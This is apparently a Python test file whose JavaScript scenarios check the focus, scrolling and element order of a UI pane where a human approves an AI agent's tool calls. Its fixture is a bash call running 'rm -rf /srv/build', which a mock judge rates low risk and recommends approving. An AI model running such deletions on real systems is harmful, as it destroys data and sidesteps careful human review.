def _coordinator(scenario: str, tmp_path: Path) -> None:
    coordinator = _COORDINATOR.read_text(encoding="utf-8")
    coordinator = coordinator.replace('from "/shared/', 'from "' + _SHARED.as_uri() + "/")
    needle = "    wsId: wsId," + chr(10) + "    connect: init,"
    assert coordinator.count(needle) == 1
    coordinator = coordinator.replace(
        needle, "    _fullViewTest: {receive: handleEvent}," + chr(10) + needle
    )
    module = tmp_path / "coordinator.mjs"
    module.write_text(coordinator, encoding="utf-8")
    _run(
        f"for (const name of {json.dumps(['utils', 'auth', 'composer_attachments', 'composer_queue', 'renderer', 'status_bar'])}) "
        f"Object.assign(globalThis, await import({json.dumps(_SHARED.as_uri())} + '/' + name + '.js'));\n"
        + r"""
globalThis.Composer = class {
  constructor() {
    this.stopBtn = document.createElement('button'); this.chipsEl = document.createElement('div');
    this.inputEl = document.createElement('textarea');
  }
  setBusy() {} setSendBlocked() {} destroy() {}
};
const posts = [];
globalThis.fetch = async (url, init) => {
  if (init && init.method === 'POST' && String(url).endsWith('/approve')) {
    posts.push(JSON.parse(init.body).approved);
  }
  return {ok: true, status: 200, json: async () => ({}), text: async () => ''};
};
"""
        + f"const {{createCoordinatorPane}} = await import({json.dumps(module.as_uri())});\n"
        + r"""
const root = document.createElement('div');
html.appendChild(root);
const pane = createCoordinatorPane(root, 'ws-c', {});
const receive = pane._fullViewTest.receive;
const rowFor = id => root.querySelector('.conv-row[data-call-id="' + id + '"]');
const key = async name => {
  const target = document.activeElement;
  let prevented = false;
  const event = {key: name, target, shiftKey: false, ctrlKey: false, metaKey: false, altKey: false,
    preventDefault() { prevented = true; }};
  for (const entry of root._listeners.get('keydown') || []) entry.fn(event);
  if (name === 'Enter' && !prevented && target && target.tagName === 'BUTTON') target.click();
  await Promise.resolve();
  await Promise.resolve();
};
const item = {call_id: 'c1', func_name: 'bash', header: 'bash: rm -rf /srv/build', preview: '',
  needs_approval: true, approval_label: 'bash', arguments: '{"command": "rm -rf /srv/build"}'};
const verdict = {type: 'intent_verdict', call_id: 'c1', recommendation: 'approve',
  risk_level: 'low', confidence: 0.9, reasoning: 'routine', tier: 'llm'};
"""
        + scenario,
        browser=True,
    )


def test_a_verdict_leaves_focus_with_a_coordinator_reader(tmp_path: Path) -> None:
    # Focused, not opened: opening would also stop the pane following, which
    # holds the focus move back on its own.
    _coordinator(
        r"""
receive({type: 'approve_request', cycle_id: 'cy1', items: [item]});
flushFrames();
const toggle = rowFor('c1').querySelector('.conv-row-full-toggle');
toggle.focus();
receive(verdict);
flushFrames();
assert(document.activeElement === toggle, 'focus stays on the call: ' + describe(document.activeElement));
await key('Enter');
assert(posts.length === 0, 'so Enter opens the call and approves nothing: ' + JSON.stringify(posts));
assert(rowFor('c1').dataset.fullCall === 'open', 'the call opened');
""",
        tmp_path,
    )


def test_a_verdict_leaves_a_coordinator_scrolled_back_where_it_is(tmp_path: Path) -> None:
    _coordinator(
        r"""
receive({type: 'approve_request', cycle_id: 'cy1', items: [item]});
flushFrames();
root.querySelector('#coord-messages').dispatchEvent(new CustomEvent('conv-detail-open', {bubbles: true}));
receive(verdict);
flushFrames();
assert(document.activeElement === null, 'nothing takes focus: ' + describe(document.activeElement));
""",
        tmp_path,
    )


def test_a_verdict_focuses_approve_for_no_one_reading(tmp_path: Path) -> None:
    _coordinator(
        r"""
receive({type: 'approve_request', cycle_id: 'cy1', items: [item]});
flushFrames();
receive(verdict);
flushFrames();
const approve = root.querySelector('.conv-actions button[data-role="approve"]');
assert(approve && document.activeElement === approve,
  'the verdict hands focus to Approve: ' + describe(document.activeElement));
""",
        tmp_path,
    )


def test_coordinator_verdicts_follow_the_open_full_call(tmp_path: Path) -> None:
    _coordinator(
        r"""
receive({type: 'approve_request', cycle_id: 'cy1', items: [item], judge_pending: true});
flushFrames();
// The fake DOM inserts a fragment as an element of its own; a browser inserts
// its children.
const order = () => rowFor('c1').children
  .flatMap(child => child.tagName === 'FRAGMENT' ? child.children : [child])
  .map(child => child.className.split(' ')[0]);
rowFor('c1').querySelector('.conv-row-full-toggle').click();
const pending = order();
assert(pending.indexOf('conv-row-full') === pending.indexOf('conv-row-call') + 1 &&
  pending.indexOf('conv-verdict') > pending.indexOf('conv-row-full'),
  'the panel opens between the call and the judge placeholder: ' + JSON.stringify(pending));
receive(verdict);
flushFrames();
const judged = order();
assert(judged.indexOf('conv-verdict') === judged.indexOf('conv-row-full') + 1,
  'the verdict lands after the open panel: ' + JSON.stringify(judged));

// A verdict for a call that already ran goes between its panel and its result.
const done = {...item, call_id: 'c2', needs_approval: false};
receive({type: 'tool_pending', items: [done]});
receive({type: 'tool_info', items: [{...done, auto_approved: true}]});
receive({type: 'tool_result', call_id: 'c2', name: 'bash', output: 'removed'});
rowFor('c2').querySelector('.conv-row-full-toggle').click();
receive({...verdict, call_id: 'c2'});
flushFrames();
const late = rowFor('c2').children
  .flatMap(child => child.tagName === 'FRAGMENT' ? child.children : [child])
  .map(child => child.className.split(' ')[0]);
const at = name => late.indexOf(name);
assert(at('conv-row-full') < at('conv-verdict') && at('conv-verdict') < at('conv-row-result'),
  'call, panel, verdict, result: ' + JSON.stringify(late));
""",
        tmp_path,
    )


def test_a_long_argument_value_gets_a_box_of_its_own() -> None:
    _builders(
        r"""
const content = Array.from({length: 400}, (_, i) => 'line ' + i).join('\n');
const el = row('write_file', JSON.stringify({path: '/srv/a.py', content}));
const [pathArg, contentArg] = open(el).querySelectorAll('.conv-full-arg');
assert(!pathArg.querySelector('.conv-result-expand'), 'a short value has no control');
assert(pathArg.querySelector('.conv-full-arg-value').dataset.expanded === undefined,
  'and no cap: it shows whole');
const control = contentArg.querySelector('.conv-result-expand');
assert(control && control.textContent === 'show all · 400 lines',
  'a long value says how long: ' + (control && control.textContent));
const value = contentArg.querySelector('.conv-full-arg-value');
assert(value.textContent === content, 'the box holds every character');
assert(value.dataset.expanded === 'false', 'capped');
control.click();
assert(value.dataset.expanded === 'true' && control.textContent === 'collapse', 'show all opens it');

const huge = 'z'.repeat(70 * 1024);
const big = open(row('write_huge', JSON.stringify({content: huge})));
const bigValue = big.querySelector('.conv-full-arg-value');
assert(bigValue.textContent.includes('truncated for display') && bigValue.textContent.length < huge.length,
  'a value past the display cut shows its head');
big.querySelector('.conv-result-expand').click();
assert(bigValue.textContent === huge, 'show all renders every character');
"""
    )


def test_the_panel_follows_the_summary_and_precedes_a_verdict() -> None:
    _builders(
        r"""
const el = conv.buildConvRow({func_name: 'edit_file', call_id: 'p1'});
for (const cls of ['conv-row-cmd', 'conv-row-diff', 'conv-redaction-note', 'conv-verdict']) {
  const part = document.createElement('div');
  part.className = cls;
  el.appendChild(part);
}
conv.attachConvFullCall(el, '{"path": "a.py"}');
assert(conv.convCallSummaryEnd(el) === el.children[3],
  'before it opens, what follows the call goes after its summary');
el.querySelector('.conv-row-full-toggle').click();
const order = el.children.map(child => child.className.split(' ')[0]);
assert(JSON.stringify(order) === JSON.stringify(['conv-row-call', 'conv-row-cmd', 'conv-row-diff',
  'conv-redaction-note', 'conv-row-full', 'conv-verdict']),
  'the panel opens after the summary, before the verdict: ' + JSON.stringify(order));
assert(conv.convCallSummaryEnd(el) === el.children[4], 'and what follows goes after the panel');
"""
    )


def test_opening_details_by_hand_stops_the_pane_following() -> None:
    _run(
        f"const conv = await import({_shared('conversation.js')});\n"
        f"const {{mountConversationScroll}} = await import({_shared('conversation_scroll.js')});\n"
        + r"""
const scroller = document.createElement('div');
html.appendChild(scroller);
scroller.clientHeight = 400; scroller.clientWidth = 800; scroller.scrollHeight = 400;
const follow = mountConversationScroll(scroller);
const opened = [];
scroller.addEventListener('conv-detail-open', () => opened.push(1));
const batch = conv.buildConvBatchShell({});
scroller.appendChild(batch);
const el = conv.buildConvRow({func_name: 'bash', call_id: 'f1'});
conv.attachConvFullCall(el, '{"command": "ls"}');
batch.appendChild(el);
conv.restoreConvFullCalls(batch, {open: new Map([['f1', new Set()]]), focused: null});
assert(el.dataset.fullCall === 'open', 'a restore reopens the call');
assert(opened.length === 0 && follow.isFollowing(), 'but is not a reader opening it');
el.querySelector('.conv-row-full-toggle').click();
el.querySelector('.conv-row-full-toggle').click();
assert(opened.length === 1, 'opening by hand says so, closing does not');
assert(!follow.isFollowing(), 'and the pane stops following new output');

follow.jumpToLatest();
const box = document.createElement('div');
batch.appendChild(box);
const control = conv.buildConvResultExpand(box, {text: 'r\n'.repeat(30), boxLines: 10, fold: true});
batch.appendChild(control);
box.click();
assert(opened.length === 2 && !follow.isFollowing(), 'unfolding a result by hand says so too');
control.click();
assert(opened.length === 2, 'collapsing does not');
"""
    )
